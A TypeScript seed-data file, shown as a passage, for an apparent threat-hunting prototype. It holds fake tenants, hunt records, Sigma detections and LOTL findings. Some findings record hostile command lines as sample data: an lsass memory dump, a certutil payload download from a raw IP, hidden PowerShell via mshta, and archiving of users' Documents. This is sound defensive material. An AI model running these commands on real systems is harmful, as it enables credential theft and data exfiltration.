// Seeded fake data for the Hunter prototype. No backend — everything is in-memory.

export type Role = "threat_hunt_analyst" | "detection_engineer" | "threat_hunt_lead" | "platform_engineer" | "customer_success";
export type Vendor = "crowdstrike" | "splunk" | "sentinelone" | "defender" | "elastic";
export type Health = "healthy" | "degraded" | "down" | "unknown";

export interface Analyst { id: string; name: string; email: string; role: Role; initials: string }
export interface McpServer { id: string; tenantId: string; vendor: Vendor; contractVersion: string; namespace: string; health: Health; lastCheck: string; latencyMs: number }
export interface Tenant {
  id: string; slug: string; name: string; industry: string; maturity: 0 | 1 | 2 | 3 | 4;
  status: "pilot" | "active" | "suspended" | "offboarded"; onboardedAt: string; repo: string;
  endpoints: number; vendors: Vendor[]; leadContact: string; huntsThisMonth: number; openFindings: number;
}
export interface Hunt {
  id: string; tenantId: string; analystId: string; title: string; hypothesis: string;
  origin: "hypothesis" | "lotl" | "dashboard"; outcome: "true_positive" | "false_positive" | "inconclusive" | null;
  status: "open" | "closed"; createdAt: string; closedAt?: string; queries: number; hostsTouched: number;
  promotedTo?: string; gitPath: string; commit: string; technique: string;
  lock: { learn: string; observe: string; check: string; keep: string };
}
export interface Detection {
  id: string; title: string; scope: "core" | "tenant"; tenantId?: string; level: "low" | "medium" | "high" | "critical";
  status: "experimental" | "test" | "stable"; backends: Array<{ backend: "spl" | "eql" | "lucene"; state: "deployed" | "pending" | "failed" | "not_deployed"; at?: string }>;
  backtestCount: number | null; backtestAt?: string; sourceHunt?: string; gitPath: string; pr?: number; updatedAt: string;
  sigma: string; compiled: Record<string, string>; logsource: string; technique: string;
}
export interface LotlFinding {
  id: string; tenantId: string; category: string; tool: string; entity: string; user: string; firstSeen: string; lastSeen: string; count: number;
  disposition: "open" | "approved" | "removed" | "escalated" | "accepted_risk"; dispositionedBy?: string; dispositionedAt?: string; linkedHunt?: string; commandLine: string;
}
export interface Dashboard {
  id: string; name: string; technique: "stack_count" | "z_score" | "interval_jitter" | "first_seen"; cadence: string; description: string;
  series: number[]; outliers: number; lastRefresh: string; entityLabel: string;
}
export interface Outlier { id: string; tenantId: string; dashboardId: string; entity: string; score: number; detectedAt: string; detail: string; confirmed: boolean | null; linkedHunt?: string }
export interface Approval {
  id: string; tenantId: string; component: "orchestrator" | "detection_compiler" | "lotl_engine" | "dashboard_service" | "reporting_service";
  actionType: "telemetry_query" | "detection_deploy" | "report_release" | "hunt_promotion" | "case_create";
  summary: string; payload: Record<string, unknown>; requestedAt: string; requestedBy: string; decision: "approved" | "denied" | null; decidedBy?: string; decidedAt?: string;
  tier: "sync" | "batchable" | "standing"; backtest?: number; maturityRequired?: number;
}
export interface Report { id: string; tenantId: string; period: "weekly" | "monthly"; start: string; end: string; status: "draft" | "released"; hunts: number; detections: number; lotlDispositions: number; outliers: number; releasedBy?: string; releasedAt?: string; gitPath: string }
export interface AuditEntry { id: number; tenantId: string; analystId?: string; component: string; action: string; tool?: string; requestHash: string; approvalId?: string; at: string }

export const analysts: Analyst[] = [
  { id: "a-paul", name: "Paul Runtalan", email: "paul@novacoast.com", role: "threat_hunt_lead", initials: "PR" },
  { id: "a-mira", name: "Mira Okonkwo", email: "mira.okonkwo@novacoast.com", role: "threat_hunt_analyst", initials: "MO" },
  { id: "a-dev", name: "Devon Alcaraz", email: "devon.alcaraz@novacoast.com", role: "detection_engineer", initials: "DA" },
  { id: "a-sam", name: "Sam Whitfield", email: "sam.whitfield@novacoast.com", role: "platform_engineer", initials: "SW" },
  { id: "a-lena", name: "Lena Marsh", email: "lena.marsh@novacoast.com", role: "customer_success", initials: "LM" },
];
export const currentAnalyst = analysts[0];

export const roleLabel: Record<Role, string> = {
  threat_hunt_analyst: "Threat hunt analyst", detection_engineer: "Detection engineer", threat_hunt_lead: "Threat hunt lead",
  platform_engineer: "Platform engineer", customer_success: "Customer success",
};

export const vendorLabel: Record<Vendor, string> = { crowdstrike: "CrowdStrike Falcon", splunk: "Splunk Cloud", sentinelone: "SentinelOne", defender: "Microsoft Defender", elastic: "Elastic" };

export const tenants: Tenant[] = [
  { id: "t-acme", slug: "acme", name: "Acme Industrial", industry: "Manufacturing", maturity: 3, status: "active", onboardedAt: "2026-02-11", repo: "tenant-acme", endpoints: 4820, vendors: ["crowdstrike", "splunk"], leadContact: "jane.doe@acme.example", huntsThisMonth: 14, openFindings: 6 },
  { id: "t-globex", slug: "globex", name: "Globex Health", industry: "Healthcare", maturity: 3, status: "active", onboardedAt: "2026-03-02", repo: "tenant-globex", endpoints: 11240, vendors: ["sentinelone", "defender"], leadContact: "r.patel@globex.example", huntsThisMonth: 9, openFindings: 11 },
  { id: "t-initech", slug: "initech", name: "Initech Financial", industry: "Financial services", maturity: 4, status: "active", onboardedAt: "2026-01-19", repo: "tenant-initech", endpoints: 2310, vendors: ["crowdstrike", "elastic"], leadContact: "secops@initech.example", huntsThisMonth: 22, openFindings: 3 },
  { id: "t-umbrella", slug: "umbrella", name: "Umbrella Logistics", industry: "Transportation", maturity: 2, status: "active", onboardedAt: "2026-05-27", repo: "tenant-umbrella", endpoints: 7605, vendors: ["defender"], leadContact: "it-sec@umbrella.example", huntsThisMonth: 4, openFindings: 9 },
  { id: "t-vandelay", slug: "vandelay", name: "Vandelay Imports", industry: "Retail", maturity: 1, status: "pilot", onboardedAt: "2026-08-14", repo: "tenant-vandelay", endpoints: 940, vendors: ["sentinelone"], leadContact: "george@vandelay.example", huntsThisMonth: 1, openFindings: 2 },
  { id: "t-stark", slug: "stark", name: "Stark Energy", industry: "Utilities", maturity: 2, status: "active", onboardedAt: "2026-06-09", repo: "tenant-stark", endpoints: 3380, vendors: ["splunk", "crowdstrike"], leadContact: "ot-sec@stark.example", huntsThisMonth: 6, openFindings: 4 },
];

export const maturityLabel = ["Unmanaged", "Repository", "Context", "Generative", "Autonomous"] as const;
export const maturityHint = [
  "No repo, no context. Hunts are ad hoc.",
  "Git repo provisioned. Records are kept.",
  "AGENTS.md and hunting knowledge populated.",
  "Assistant hunts from the prompt across live telemetry.",
  "Scheduled agents draft proposals for analyst approval.",
];

export const mcpServers: McpServer[] = [
  { id: "s1", tenantId: "t-acme", vendor: "crowdstrike", contractVersion: "1.0.2", namespace: "tenant-acme", health: "healthy", lastCheck: "2026-09-08T13:41:12Z", latencyMs: 842 },
  { id: "s2", tenantId: "t-acme", vendor: "splunk", contractVersion: "1.0.1", namespace: "tenant-acme", health: "healthy", lastCheck: "2026-09-08T13:41:10Z", latencyMs: 1310 },
  { id: "s3", tenantId: "t-globex", vendor: "sentinelone", contractVersion: "1.0.2", namespace: "tenant-globex", health: "degraded", lastCheck: "2026-09-08T13:40:58Z", latencyMs: 4120 },
  { id: "s4", tenantId: "t-globex", vendor: "defender", contractVersion: "1.0.0", namespace: "tenant-globex", health: "healthy", lastCheck: "2026-09-08T13:41:03Z", latencyMs: 960 },
  { id: "s5", tenantId: "t-initech", vendor: "crowdstrike", contractVersion: "1.0.2", namespace: "tenant-initech", health: "healthy", lastCheck: "2026-09-08T13:41:15Z", latencyMs: 790 },
  { id: "s6", tenantId: "t-initech", vendor: "elastic", contractVersion: "1.0.2", namespace: "tenant-initech", health: "healthy", lastCheck: "2026-09-08T13:41:14Z", latencyMs: 610 },
  { id: "s7", tenantId: "t-umbrella", vendor: "defender", contractVersion: "1.0.0", namespace: "tenant-umbrella", health: "healthy", lastCheck: "2026-09-08T13:40:49Z", latencyMs: 1050 },
  { id: "s8", tenantId: "t-vandelay", vendor: "sentinelone", contractVersion: "0.9.4", namespace: "tenant-vandelay", health: "unknown", lastCheck: "2026-09-07T22:10:00Z", latencyMs: 0 },
  { id: "s9", tenantId: "t-stark", vendor: "splunk", contractVersion: "1.0.1", namespace: "tenant-stark", health: "healthy", lastCheck: "2026-09-08T13:41:09Z", latencyMs: 1480 },
  { id: "s10", tenantId: "t-stark", vendor: "crowdstrike", contractVersion: "1.0.2", namespace: "tenant-stark", health: "down", lastCheck: "2026-09-08T13:38:22Z", latencyMs: 0 },
];

export const hunts: Hunt[] = [
  {
    id: "H-0142", tenantId: "t-acme", analystId: "a-paul", title: "Rundll32 JavaScript protocol execution from Office parents",
    hypothesis: "An attacker delivering a malicious document could use rundll32.exe with the javascript: protocol handler to execute script without dropping a file. Look for rundll32 spawned by Office processes with a javascript: argument.",
    origin: "hypothesis", outcome: "true_positive", status: "closed", createdAt: "2026-09-02T14:02:00Z", closedAt: "2026-09-02T15:47:00Z", queries: 6, hostsTouched: 3, promotedTo: "8f2c1a4e", gitPath: "tenant-acme/hunts/H-0142-rundll32-javascript.md", commit: "c41e9b2", technique: "T1218.011",
    lock: {
      learn: "AGENTS.md notes ScreenConnect as contracted RMM and a nightly backup job as expected egress. No prior hunts on rundll32 for this tenant. Core prompt library entry PL-017 (LOLBin script hosts) loaded.",
      observe: "Queried process_execution for rundll32.exe with command_line containing javascript: over 2026-08-31 to 2026-09-02. 3 records returned across WKS-04821, WKS-04833, WKS-05102. All parented by outlook.exe.",
      check: "Enriched WKS-04821. Parent chain outlook.exe → rundll32.exe → powershell.exe with encoded command reaching 185.220.101.4. Hash not present in intel, but the sequence matches phishing-to-loader behavior. Confirmed true positive on two hosts; third host was a failed execution.",
      keep: "Escalated to Acme's threat hunt lead. Promoted to Sigma rule 8f2c1a4e (Rundll32 JavaScript Protocol Execution), PR #31, backtest 3 findings over 30 days. Added to hunting-knowledge.md: outlook.exe parenting rundll32 is never expected in this environment.",
    },
  },
  {
    id: "H-0141", tenantId: "t-initech", analystId: "a-mira", title: "Beaconing to newly registered domains from finance segment",
    hypothesis: "Periodic outbound DNS queries at a fixed interval from finance-segment hosts to domains registered in the last 30 days would indicate C2 beaconing.",
    origin: "dashboard", outcome: "false_positive", status: "closed", createdAt: "2026-09-01T09:15:00Z", closedAt: "2026-09-01T10:02:00Z", queries: 4, hostsTouched: 2, gitPath: "tenant-initech/hunts/H-0141-nrd-beaconing.md", commit: "9a02f7d", technique: "T1071.004",
    lock: {
      learn: "Beaconing dashboard flagged FIN-LT-0221 at a 300s interval with 2.1% jitter to updates.vendorcdn-new.example.",
      observe: "dns_query and network_connection over 72h. 864 connections, interval 300s ±6s.",
      check: "Domain registered 19 days ago but resolves to a known CDN ASN; process is a signed vendor updater. Intel lookup clean.",
      keep: "False positive. Added domain to dashboards/tuning/beaconing.yml with 90-day expiry and a note to re-review.",
    },
  },
  {
    id: "H-0140", tenantId: "t-globex", analystId: "a-mira", title: "AnyDesk installs outside the approved-software allowlist",
    hypothesis: "LOTL scan surfaced AnyDesk on 4 clinical workstations. Globex's contracted remote tool is TeamViewer; AnyDesk should not be present.",
    origin: "lotl", outcome: "inconclusive", status: "open", createdAt: "2026-09-05T16:30:00Z", queries: 3, hostsTouched: 4, gitPath: "tenant-globex/hunts/H-0140-anydesk-unapproved.md", commit: "3be1c04", technique: "T1219",
    lock: {
      learn: "approved-software.yml lists TeamViewer only. Prior finding L-0088 (AnyDesk on a single host) was dispositioned Removed in July.",
      observe: "Four hosts running AnyDesk.exe, installed within a 20-minute window on 2026-09-04 from a shared network path.",
      check: "Installer source is an internal file share used by the imaging team. Awaiting confirmation from Globex IT whether a technician pushed it.",
      keep: "Open. Escalated disposition pending vendor confirmation.",
    },
  },
  {
    id: "H-0139", tenantId: "t-stark", analystId: "a-paul", title: "Certutil download-and-decode chains on OT jump hosts",
    hypothesis: "certutil.exe with -urlcache or -decode on jump hosts bridging IT and OT networks would be a strong signal of tooling staging.",
    origin: "hypothesis", outcome: "false_positive", status: "closed", createdAt: "2026-08-29T11:00:00Z", closedAt: "2026-08-29T11:38:00Z", queries: 2, hostsTouched: 1, gitPath: "tenant-stark/hunts/H-0139-certutil-jump.md", commit: "d77a1e1", technique: "T1105",
    lock: { learn: "No prior certutil hunts. Jump hosts enumerated in AGENTS.md.", observe: "One match: JMP-OT-02, certutil -urlcache -f pulling a CRL from an internal PKI host.", check: "Legitimate CRL refresh by a scheduled task.", keep: "Documented the PKI CRL job as known-benign in hunting-knowledge.md." },
  },
  {
    id: "H-0138", tenantId: "t-umbrella", analystId: "a-dev", title: "Privilege drift: new local admins on dispatch terminals",
    hypothesis: "Dashboard flagged 11 new local administrator group additions in 24h on dispatch terminals, well above the 30-day baseline of 0.4/day.",
    origin: "dashboard", outcome: "true_positive", status: "closed", createdAt: "2026-08-27T08:45:00Z", closedAt: "2026-08-27T13:20:00Z", queries: 7, hostsTouched: 11, gitPath: "tenant-umbrella/hunts/H-0138-privilege-drift.md", commit: "51fa9c0", technique: "T1098",
    lock: { learn: "Privilege drift dashboard baseline 0.4 additions/day.", observe: "11 additions from a single service account svc-deploy within 6 minutes.", check: "svc-deploy credentials were used from an unfamiliar workstation. Confirmed unauthorized use.", keep: "True positive. Case opened on Defender via case.create. Hunt promoted to a tenant detection." },
  },
  {
    id: "H-0137", tenantId: "t-acme", analystId: "a-mira", title: "Scheduled task persistence via schtasks from user temp",
    hypothesis: "schtasks.exe creating tasks whose action points to a binary in a user's temp directory.",
    origin: "hypothesis", outcome: "inconclusive", status: "closed", createdAt: "2026-08-25T15:10:00Z", closedAt: "2026-08-25T16:05:00Z", queries: 3, hostsTouched: 0, gitPath: "tenant-acme/hunts/H-0137-schtasks-temp.md", commit: "e10b3aa", technique: "T1053.005",
    lock: { learn: "Core prompt library PL-022.", observe: "Zero matches in 14 days.", check: "Coverage validated by a benign test task.", keep: "No findings. Retained as a coverage note." },
  },
];

const sigmaRundll = `title: Rundll32 JavaScript Protocol Execution
id: 8f2c1a4e-1234-4abc-9def-000000000001
status: experimental
description: Detects rundll32.exe invoked with the javascript: protocol handler, a fileless script execution technique.
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
author: Paul Runtalan (Novacoast)
date: 2026/09/02
tags:
  - attack.defense_evasion
  - attack.t1218.011
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\rundll32.exe'
    CommandLine|contains: 'javascript:'
  condition: selection
falsepositives:
  - Unknown
level: high`;

export const detections: Detection[] = [
  {
    id: "8f2c1a4e", title: "Rundll32 JavaScript Protocol Execution", scope: "tenant", tenantId: "t-acme", level: "high", status: "experimental",
    backends: [{ backend: "spl", state: "deployed", at: "2026-09-03T10:12:00Z" }, { backend: "eql", state: "not_deployed" }],
    backtestCount: 3, backtestAt: "2026-09-03T09:40:00Z", sourceHunt: "H-0142", gitPath: "tenant-acme/detections/sigma/rundll32-javascript-protocol.yml", pr: 31, updatedAt: "2026-09-03T10:12:00Z",
    sigma: sigmaRundll, logsource: "process_creation / windows", technique: "T1218.011",
    compiled: { spl: `index=* Image="*\\\\rundll32.exe" CommandLine="*javascript:*"`, eql: `process where process.name : "rundll32.exe" and\n  process.command_line : "*javascript:*"` },
  },
  {
    id: "b71d02c9", title: "Unauthorized Local Administrator Addition by Service Account", scope: "tenant", tenantId: "t-umbrella", level: "critical", status: "test",
    backends: [{ backend: "lucene", state: "pending" }],
    backtestCount: 11, backtestAt: "2026-09-06T02:00:00Z", sourceHunt: "H-0138", gitPath: "tenant-umbrella/detections/sigma/svc-local-admin-add.yml", pr: 12, updatedAt: "2026-09-06T02:04:00Z",
    sigma: `title: Unauthorized Local Administrator Addition by Service Account\nid: b71d02c9-77ab-4f10-9c1e-000000000002\nstatus: test\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4732\n    SubjectUserName|startswith: 'svc-'\n    TargetUserName: 'Administrators'\n  condition: selection\nlevel: critical`, logsource: "security / windows", technique: "T1098",
    compiled: { lucene: `event.code:4732 AND winlog.event_data.SubjectUserName:svc-* AND winlog.event_data.TargetUserName:"Administrators"` },
  },
  {
    id: "c0a4e88f", title: "Certutil Download or Decode Activity", scope: "core", level: "medium", status: "stable",
    backends: [{ backend: "spl", state: "deployed", at: "2026-06-14T00:00:00Z" }, { backend: "eql", state: "deployed", at: "2026-06-14T00:00:00Z" }, { backend: "lucene", state: "deployed", at: "2026-06-14T00:00:00Z" }],
    backtestCount: null, gitPath: "core/detections/sigma/certutil-download-decode.yml", updatedAt: "2026-06-14T00:00:00Z",
    sigma: `title: Certutil Download or Decode Activity\nid: c0a4e88f-0b1c-4d2e-8f3a-000000000003\nstatus: stable\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\\\certutil.exe'\n    CommandLine|contains:\n      - '-urlcache'\n      - '-decode'\n  condition: selection\nlevel: medium`, logsource: "process_creation / windows", technique: "T1105",
    compiled: { spl: `index=* Image="*\\\\certutil.exe" (CommandLine="*-urlcache*" OR CommandLine="*-decode*")`, eql: `process where process.name : "certutil.exe" and process.command_line : ("*-urlcache*", "*-decode*")`, lucene: `process.name:"certutil.exe" AND process.command_line:(*-urlcache* OR *-decode*)` },
  },
  {
    id: "d3e9a1b0", title: "Remote Access Tool Outside Allowlist", scope: "core", level: "medium", status: "stable",
    backends: [{ backend: "spl", state: "deployed", at: "2026-05-01T00:00:00Z" }, { backend: "eql", state: "deployed", at: "2026-05-01T00:00:00Z" }, { backend: "lucene", state: "failed", at: "2026-08-30T00:00:00Z" }],
    backtestCount: null, gitPath: "core/detections/sigma/rat-outside-allowlist.yml", updatedAt: "2026-08-30T00:00:00Z",
    sigma: `title: Remote Access Tool Outside Allowlist\nid: d3e9a1b0-...\nstatus: stable\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith:\n      - '\\\\AnyDesk.exe'\n      - '\\\\TeamViewer.exe'\n      - '\\\\ScreenConnect.ClientService.exe'\n      - '\\\\atera.exe'\n  condition: selection\nlevel: medium`, logsource: "process_creation / windows", technique: "T1219",
    compiled: { spl: `index=* (Image="*\\\\AnyDesk.exe" OR Image="*\\\\TeamViewer.exe" OR Image="*\\\\ScreenConnect.ClientService.exe" OR Image="*\\\\atera.exe")` },
  },
  {
    id: "e5f7c2d4", title: "PowerShell Encoded Command with Network Egress", scope: "core", level: "high", status: "stable",
    backends: [{ backend: "spl", state: "deployed", at: "2026-04-10T00:00:00Z" }, { backend: "eql", state: "deployed", at: "2026-04-10T00:00:00Z" }, { backend: "lucene", state: "deployed", at: "2026-04-10T00:00:00Z" }],
    backtestCount: null, gitPath: "core/detections/sigma/powershell-encoded-egress.yml", updatedAt: "2026-04-10T00:00:00Z",
    sigma: `title: PowerShell Encoded Command with Network Egress\nid: e5f7c2d4-...\nstatus: stable\nlevel: high`, logsource: "process_creation / windows", technique: "T1059.001",
    compiled: { spl: `index=* Image="*\\\\powershell.exe" (CommandLine="* -enc *" OR CommandLine="* -EncodedCommand *")` },
  },
  {
    id: "f9081ab7", title: "Beaconing to Newly Registered Domain", scope: "tenant", tenantId: "t-initech", level: "high", status: "experimental",
    backends: [{ backend: "eql", state: "not_deployed" }, { backend: "lucene", state: "not_deployed" }],
    backtestCount: 42, backtestAt: "2026-09-07T03:00:00Z", gitPath: "tenant-initech/detections/sigma/nrd-beaconing.yml", pr: 48, updatedAt: "2026-09-07T03:02:00Z",
    sigma: `title: Beaconing to Newly Registered Domain\nid: f9081ab7-...\nstatus: experimental\nlevel: high`, logsource: "dns_query / windows", technique: "T1071.004",
    compiled: { eql: `sequence by host.id with maxspan=10m [dns where dns.question.registered_domain in nrd_list] [dns where dns.question.registered_domain in nrd_list]` },
  },
  {
    id: "1a2b3c4d", title: "Suspicious Scheduled Task from User Temp", scope: "core", level: "medium", status: "test",
    backends: [{ backend: "spl", state: "deployed", at: "2026-08-20T00:00:00Z" }, { backend: "eql", state: "pending" }, { backend: "lucene", state: "deployed", at: "2026-08-20T00:00:00Z" }],
    backtestCount: null, gitPath: "core/detections/sigma/schtasks-user-temp.yml", updatedAt: "2026-08-20T00:00:00Z",
    sigma: `title: Suspicious Scheduled Task from User Temp\nid: 1a2b3c4d-...\nstatus: test\nlevel: medium`, logsource: "process_creation / windows", technique: "T1053.005",
    compiled: { spl: `index=* Image="*\\\\schtasks.exe" CommandLine="*\\\\AppData\\\\Local\\\\Temp\\\\*"` },
  },
];

export const lotlCategories: Record<string, string> = {
  remote_access_tools: "Remote access tools", script_hosts: "Script hosts", download_utilities: "Download utilities",
  credential_access: "Credential access", tunneling: "Tunneling and proxies", trusted_sites: "Trusted-site abuse", archive_utilities: "Archive utilities",
};

export const lotlFindings: LotlFinding[] = [
  { id: "L-0112", tenantId: "t-globex", category: "remote_access_tools", tool: "AnyDesk", entity: "CLN-WS-1183", user: "globex\\tmurphy", firstSeen: "2026-09-04T15:12:00Z", lastSeen: "2026-09-08T09:44:00Z", count: 38, disposition: "escalated", dispositionedBy: "a-mira", dispositionedAt: "2026-09-05T16:30:00Z", linkedHunt: "H-0140", commandLine: `"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe" --service` },
  { id: "L-0113", tenantId: "t-globex", category: "remote_access_tools", tool: "AnyDesk", entity: "CLN-WS-1190", user: "globex\\aortiz", firstSeen: "2026-09-04T15:19:00Z", lastSeen: "2026-09-08T11:02:00Z", count: 41, disposition: "open", commandLine: `"C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe" --service` },
  { id: "L-0114", tenantId: "t-globex", category: "tunneling", tool: "ngrok", entity: "DEV-LT-0042", user: "globex\\klee", firstSeen: "2026-09-07T20:03:00Z", lastSeen: "2026-09-07T22:51:00Z", count: 3, disposition: "open", commandLine: `ngrok.exe tcp 3389 --region us` },
  { id: "L-0115", tenantId: "t-acme", category: "script_hosts", tool: "mshta", entity: "WKS-04833", user: "acme\\rbrooks", firstSeen: "2026-09-06T08:11:00Z", lastSeen: "2026-09-06T08:11:00Z", count: 1, disposition: "open", commandLine: `mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -w hidden"",0")` },
  { id: "L-0116", tenantId: "t-acme", category: "download_utilities", tool: "bitsadmin", entity: "SRV-FILE-02", user: "NT AUTHORITY\\SYSTEM", firstSeen: "2026-09-05T02:00:00Z", lastSeen: "2026-09-08T02:00:00Z", count: 4, disposition: "open", commandLine: `bitsadmin /transfer patchjob /download /priority normal https://updates.acme-internal.example/kb.msp C:\\Temp\\kb.msp` },
  { id: "L-0117", tenantId: "t-initech", category: "credential_access", tool: "procdump", entity: "FIN-LT-0221", user: "initech\\hvogel", firstSeen: "2026-09-08T07:30:00Z", lastSeen: "2026-09-08T07:31:00Z", count: 2, disposition: "open", commandLine: `procdump64.exe -ma lsass.exe C:\\Users\\hvogel\\AppData\\Local\\Temp\\ls.dmp` },
  { id: "L-0118", tenantId: "t-umbrella", category: "archive_utilities", tool: "7-Zip (CLI)", entity: "DSP-TERM-07", user: "umbrella\\svc-deploy", firstSeen: "2026-09-03T04:15:00Z", lastSeen: "2026-09-07T04:15:00Z", count: 5, disposition: "open", commandLine: `7z.exe a -p -mhe=on C:\\Users\\Public\\out.7z C:\\Users\\*\\Documents` },
  { id: "L-0119", tenantId: "t-umbrella", category: "trusted_sites", tool: "Discord CDN", entity: "DSP-TERM-03", user: "umbrella\\jwalsh", firstSeen: "2026-09-06T13:42:00Z", lastSeen: "2026-09-06T13:42:00Z", count: 1, disposition: "open", commandLine: `curl.exe -o C:\\Users\\jwalsh\\Downloads\\invoice.exe https://cdn.discordapp.com/attachments/...` },
  { id: "L-0120", tenantId: "t-stark", category: "remote_access_tools", tool: "ScreenConnect", entity: "ENG-WS-0311", user: "stark\\pmason", firstSeen: "2026-09-02T10:00:00Z", lastSeen: "2026-09-08T10:00:00Z", count: 96, disposition: "open", commandLine: `ScreenConnect.ClientService.exe "?e=Access&y=Guest&h=relay.stark-msp.example"` },
  { id: "L-0110", tenantId: "t-acme", category: "remote_access_tools", tool: "ScreenConnect", entity: "WKS-03310", user: "acme\\itsupport", firstSeen: "2026-08-30T09:20:00Z", lastSeen: "2026-09-08T12:00:00Z", count: 210, disposition: "approved", dispositionedBy: "a-paul", dispositionedAt: "2026-08-30T10:05:00Z", commandLine: `ScreenConnect.ClientService.exe "?e=Access&y=Guest&h=relay.acme-it.example"` },
  { id: "L-0108", tenantId: "t-vandelay", category: "script_hosts", tool: "wscript", entity: "VAN-POS-12", user: "vandelay\\pos", firstSeen: "2026-08-28T06:00:00Z", lastSeen: "2026-09-08T06:00:00Z", count: 12, disposition: "accepted_risk", dispositionedBy: "a-paul", dispositionedAt: "2026-08-29T14:10:00Z", commandLine: `wscript.exe C:\\POS\\sync.vbs` },
  { id: "L-0105", tenantId: "t-globex", category: "download_utilities", tool: "certutil", entity: "CLN-WS-0871", user: "globex\\nbaxter", firstSeen: "2026-08-22T11:00:00Z", lastSeen: "2026-08-22T11:00:00Z", count: 1, disposition: "removed", dispositionedBy: "a-mira", dispositionedAt: "2026-08-23T09:00:00Z", commandLine: `certutil -urlcache -split -f http://45.33.12.9/a.txt a.exe` },
];

export const dashboards: Dashboard[] = [
  { id: "rare-parent-child", name: "Rare parent–child process pairs", technique: "stack_count", cadence: "daily", description: "Least-frequent parent→child process pairs across the fleet.", series: [12, 9, 14, 11, 10, 13, 9, 8, 12, 15, 11, 10, 9, 24], outliers: 4, lastRefresh: "2026-09-08T06:00:00Z", entityLabel: "Process pair" },
  { id: "beaconing", name: "Beaconing and periodicity", technique: "interval_jitter", cadence: "hourly", description: "Outbound connections with fixed intervals and low jitter.", series: [3, 2, 4, 3, 3, 2, 5, 3, 2, 4, 3, 6, 4, 7], outliers: 3, lastRefresh: "2026-09-08T13:00:00Z", entityLabel: "Host → destination" },
  { id: "egress-outliers", name: "Egress volume outliers", technique: "z_score", cadence: "daily", description: "Hosts whose outbound bytes exceed their rolling baseline.", series: [1, 2, 1, 1, 3, 2, 1, 1, 2, 1, 1, 4, 2, 3], outliers: 2, lastRefresh: "2026-09-08T06:00:00Z", entityLabel: "Host" },
  { id: "first-seen-binaries", name: "First-seen binaries", technique: "first_seen", cadence: "daily", description: "Executables never observed before on the tenant fleet.", series: [30, 28, 41, 25, 33, 29, 27, 31, 26, 38, 30, 29, 55, 34], outliers: 6, lastRefresh: "2026-09-08T06:00:00Z", entityLabel: "Binary" },
  { id: "privilege-drift", name: "Privilege drift", technique: "z_score", cadence: "daily", description: "Additions to privileged groups versus the 30-day baseline.", series: [0, 1, 0, 0, 1, 0, 0, 11, 0, 1, 0, 0, 2, 0], outliers: 1, lastRefresh: "2026-09-08T06:00:00Z", entityLabel: "Account" },
  { id: "auth-anomalies", name: "Authentication anomalies", technique: "z_score", cadence: "hourly", description: "Logon volume, off-hours logons, and new source–destination pairs.", series: [5, 4, 6, 5, 4, 7, 5, 4, 6, 5, 9, 5, 4, 8], outliers: 3, lastRefresh: "2026-09-08T13:00:00Z", entityLabel: "Account → host" },
  { id: "rare-scheduled-tasks", name: "Rare scheduled tasks and services", technique: "stack_count", cadence: "daily", description: "Persistence mechanisms present on very few hosts.", series: [2, 3, 2, 2, 1, 3, 2, 2, 4, 2, 3, 2, 2, 5], outliers: 2, lastRefresh: "2026-09-08T06:00:00Z", entityLabel: "Task or service" },
  { id: "dns-rarity", name: "DNS rarity and new domains", technique: "first_seen", cadence: "hourly", description: "Domains resolved by few hosts, or registered recently.", series: [40, 38, 45, 42, 39, 41, 44, 40, 47, 43, 39, 42, 61, 44], outliers: 5, lastRefresh: "2026-09-08T13:00:00Z", entityLabel: "Domain" },
];

export const outliers: Outlier[] = [
  { id: "O-901", tenantId: "t-acme", dashboardId: "rare-parent-child", entity: "outlook.exe → rundll32.exe", score: 0.0004, detectedAt: "2026-09-02T06:00:00Z", detail: "Seen on 3 of 4,820 hosts. Never observed before in 90 days.", confirmed: true, linkedHunt: "H-0142" },
  { id: "O-902", tenantId: "t-initech", dashboardId: "beaconing", entity: "FIN-LT-0221 → updates.vendorcdn-new.example", score: 0.98, detectedAt: "2026-09-01T08:00:00Z", detail: "300s interval, 2.1% jitter, 864 connections in 72h.", confirmed: false, linkedHunt: "H-0141" },
  { id: "O-903", tenantId: "t-umbrella", dashboardId: "privilege-drift", entity: "svc-deploy", score: 8.7, detectedAt: "2026-08-27T06:00:00Z", detail: "11 Administrators additions in 6 minutes. Baseline 0.4/day.", confirmed: true, linkedHunt: "H-0138" },
  { id: "O-904", tenantId: "t-globex", dashboardId: "first-seen-binaries", entity: "AnyDesk.exe", score: 1, detectedAt: "2026-09-05T06:00:00Z", detail: "First seen on 4 hosts within a 20-minute window.", confirmed: null },
  { id: "O-905", tenantId: "t-stark", dashboardId: "egress-outliers", entity: "ENG-WS-0311", score: 4.2, detectedAt: "2026-09-08T06:00:00Z", detail: "3.1 GB outbound to relay.stark-msp.example. Baseline 240 MB/day.", confirmed: null },
  { id: "O-906", tenantId: "t-acme", dashboardId: "dns-rarity", entity: "a1b2-cdn-sync.example", score: 1, detectedAt: "2026-09-08T12:00:00Z", detail: "Resolved by 1 host. Registered 4 days ago.", confirmed: null },
  { id: "O-907", tenantId: "t-initech", dashboardId: "auth-anomalies", entity: "hvogel → FIN-SRV-01", score: 3.9, detectedAt: "2026-09-08T07:00:00Z", detail: "First interactive logon to a server from this account. 07:28 local.", confirmed: null },
  { id: "O-908", tenantId: "t-globex", dashboardId: "beaconing", entity: "DEV-LT-0042 → 3.tcp.ngrok.io", score: 0.94, detectedAt: "2026-09-07T21:00:00Z", detail: "60s interval, 0.8% jitter.", confirmed: null },
  { id: "O-909", tenantId: "t-umbrella", dashboardId: "rare-scheduled-tasks", entity: "\\Microsoft\\Windows\\SyncHelper", score: 0.001, detectedAt: "2026-09-08T06:00:00Z", detail: "Present on 2 hosts. Action: C:\\Users\\Public\\sync.exe", confirmed: null },
  { id: "O-910", tenantId: "t-acme", dashboardId: "first-seen-binaries", entity: "kb.msp", score: 1, detectedAt: "2026-09-08T06:00:00Z", detail: "Dropped by bitsadmin on SRV-FILE-02.", confirmed: null },
];

export const approvals: Approval[] = [
